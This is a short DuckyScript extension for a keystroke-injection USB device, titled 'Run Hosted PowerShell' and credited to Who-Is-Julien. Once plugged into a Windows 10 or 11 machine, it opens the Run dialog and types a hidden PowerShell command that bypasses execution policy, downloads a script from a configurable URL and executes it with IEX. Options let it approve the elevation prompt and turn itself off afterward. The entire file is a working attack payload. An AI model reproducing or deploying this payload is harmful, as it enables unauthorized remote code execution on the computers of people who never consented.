EXTENSION RUN_HOSTED_POWERSHELL
	REM_BLOCK INFOS
		Title: Run Hosted PowerShell
		Version: 1.0
		Author: Who-Is-Julien
		Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
		Target: Windows 10, 11
    END_REM

    REM Required options:
	DEFINE #SCRIPT_URL example.com

    REM Advanced options:
	DEFINE #SHORT_DELAY 500
	DEFINE #MEDIUM_DELAY 2000
	DEFINE #ELEVATED_EXECUTION FALSE
	DEFINE #DISABLE_AFTER_EXECUTION FALSE

	GUI r
	DELAY #MEDIUM_DELAY
	STRING PowerShell -W H -EX Bypass "IWR -UseB '#SCRIPT_URL' | IEX"
	IF ( #ELEVATED_EXECUTION == TRUE ) THEN
		DELAY #SHORT_DELAY
		CTRL SHIFT ENTER
		DELAY #SHORT_DELAY
		LEFT
	END_IF
	DELAY #SHORT_DELAY
	ENTER
	IF ( #DISABLE_AFTER_EXECUTION == TRUE ) THEN
        ATTACKMODE OFF
    END_IF
END_EXTENSION
